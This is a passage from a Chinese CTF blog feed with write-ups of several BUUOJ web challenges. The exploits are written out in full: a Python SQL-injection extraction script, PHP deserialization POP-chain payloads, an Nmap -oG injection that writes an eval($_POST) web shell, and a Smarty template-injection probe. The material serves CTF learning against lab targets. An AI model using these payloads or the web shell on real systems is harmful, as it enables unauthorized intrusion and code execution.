class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">ch = string.ascii_lowercase+string.digits+<span class="string">'-&#125;'</span>+<span class="string">'&#123;'</span></span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = <span class="string">'http://be50c81b-e823-4784-8255-cb37e1378c8c.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(email,username)</span>:</span></span><br><span class="line">    url1 = url+<span class="string">'register.php'</span></span><br><span class="line">    data = dict(email = email, username = username,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    url2 = url+<span class="string">'login.php'</span></span><br><span class="line">    data = dict(email = email,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    payload = <span class="string">"0'^(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))^'0"</span>.format(int(j)*<span class="number">10</span>+<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">    email = <span class="string">'&#123;&#125;@qq.com'</span>.format(str(j)+<span class="string">'14'</span>)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    <span class="comment"># print html.text</span></span><br><span class="line">    html = login(email)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = r.findall(<span class="string">r'&lt;span class="user-name"&gt;(.*?)&lt;/span&gt;'</span>,html.text,r.S)</span><br><span class="line">        flag = res[<span class="number">0</span>][<span class="number">1</span>:].strip()</span><br><span class="line">        print(flag)</span><br><span class="line">        f += flag</span><br><span class="line">        print(f)</span><br><span class="line">        print(f.decode(<span class="string">'hex'</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"problem"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入题型很多，方法还是那一些，就把SQL注入题放一起，方便复习回顾
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>unserialize</title>
    <link href="http://yoursite.com/2020/05/30/unserialize/"/>
    <id>http://yoursite.com/2020/05/30/unserialize/</id>
    <published>2020-05-30T02:07:43.000Z</published>
    <updated>2020-06-03T13:12:29.063Z</updated>
    
    <content type="html"><![CDATA[<p>序列化<a id="more"></a>与php的魔术方法有关，做题前对魔术方法来个归纳</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line">__isset()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line">__unset()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>先贴源码，再好好分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>单独来看看几个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发__invoke()魔术方法时，会调用append方法，包含$var,想办法包含flag.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化函数会触发__wakeup()魔术方法，这里__wakeup()能够触发__toString()魔术方法，让str为Test()类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把对象以函数的形式返回</p><p>pop</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show--__wakeup--toString()--Test--__get()--Modifier--__invoke()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h3><p>这道题拖拖拉拉好几天了，今天来写一下吧</p><p>注册登录，有个上传文件，扫了一下，发现了<a href="http://www.tar.tz，下载扒下源码，有很多文件，看了freebuf上的wp，在application/web/controller/Register.php和application/web/controller/Index.php两个文件中存在着可利用点，下面就是来做代码审计了，就是因为水平不够，不是为了做题而做题，为了理清思路三天断断续续花了俩小时，还是很有收获的" target="_blank" rel="noopener">www.tar.tz，下载扒下源码，有很多文件，看了freebuf上的wp，在application/web/controller/Register.php和application/web/controller/Index.php两个文件中存在着可利用点，下面就是来做代码审计了，就是因为水平不够，不是为了做题而做题，为了理清思路三天断断续续花了俩小时，还是很有收获的</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>register.php中有一个析构函数，这里要让registed=0就能够调用index()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>profile中有两个魔术方法，调用不可访问对象时会触发__get，调用不可访问的方法时会触发__call魔术方法，这样通过上面的析构方法，让checker等于Profile类就能够触发__call魔术方法，然后进入函数会触发$this-&gt;index，调用不存在的对象    ，触发__get，返回$this-&gt;except[‘index’]，此时将except赋值为数组调用upload_img函数，就可以进行文件的复制、重命名</p><p>pop</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Register-&gt;__destruct</span><br><span class="line">Profile-&gt; __call</span><br><span class="line">Profile-&gt; __get</span><br><span class="line">Profile-&gt; upload_img()</span><br></pre></td></tr></table></figure><p>附上自己的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/adeee0c170ad4ffb110df0cde294aecd/0094fbc2d7c3eb5bdfd1254e438b0c83.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/adeee0c170ad4ffb110df0cde294aecd/0094fbc2d7c3eb5bdfd1254e438b0c83.php"</span>;<span class="comment">//这里的路径来自源码中，自己找找能看到</span></span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/30/unserialize/1.png" class="" title="examplename"><p>成功改了文件名，蚁剑连接，根目录下找到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;序列化
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>buuoj4</title>
    <link href="http://yoursite.com/2020/05/29/buuoj4/"/>
    <id>http://yoursite.com/2020/05/29/buuoj4/</id>
    <published>2020-05-29T08:24:39.000Z</published>
    <updated>2020-06-04T13:01:18.390Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><a id="more"></a><p>开题，源码处有提示，google，好像是php.ini中的设置不对</p><p>抓包，有发现</p><img src="/2020/05/29/buuoj4/1.png" class="" title="examplename"><p>func=?&amp;p=?,这里前面的应该是填函数，后面是内容，测试一下，果然行的通，读取一下index.php文件吧</p><p>这里用readfile或者file_get_contents,post交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;file_get_contents&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到过滤了很多命令执行函数，不过看到了魔术方法，应该可以用反序列化的方法达到目的</p><p>这里学到一个很重要的知识点，菜鸡现在才知道！！！</p><p><strong>不在黑盒中的魔术方法用反序列化的数据可以绕过黑盒对命令执行函数的绕过！！！</strong></p><p>学到了学到了，拿这题就简单了，先读取一下根目录下的文件有哪些吧</p><img src="/2020/05/29/buuoj4/2.png" class="" title="examplename"><p>可以看到没有flag文件，那就稍稍找找，在/tmp目录下找到了，下面就读取吧，这里有点小问题，我用readfile读不出，想想还是用序列化吧hhh</p><img src="/2020/05/29/buuoj4/3.png" class="" title="examplename"><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><img src="/2020/05/29/buuoj4/4.png" class="" title="examplename"><p>nmap，找找nmap的常用命令，-oG，将结果Grep保存，构造一句话木马，用-oG保存到文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure><p>弹窗hacker，应该是被过滤了什么，fuzz，php被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?= @eval($_POST["hack"]);?&gt; -oG hack.phtml '</span></span><br></pre></td></tr></table></figure><img src="/2020/05/29/buuoj4/5.png" class="" title="examplename"><p>尝试访问我们打上去的文件，并且给hack传值</p><img src="/2020/05/29/buuoj4/6.png" class="" title="examplename"><p>成功显示phpinfo页面，直接读flag吧</p><img src="/2020/05/29/buuoj4/7.png" class="" title="examplename"><h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>开题</p><img src="/2020/05/29/buuoj4/8.png" class="" title="examplename"><p>smarty模板写的，又提示XFF，好像和之前BJD那道差不多，抓包测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For：&#123;7+7&#125;</span><br><span class="line">&#x2F;&#x2F;&#x2F;在client-ip处回显14</span><br></pre></td></tr></table></figure><p>找一下smarty模板注入漏洞，拿来直接用，直接能读到根目录下的flag</p><h3 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 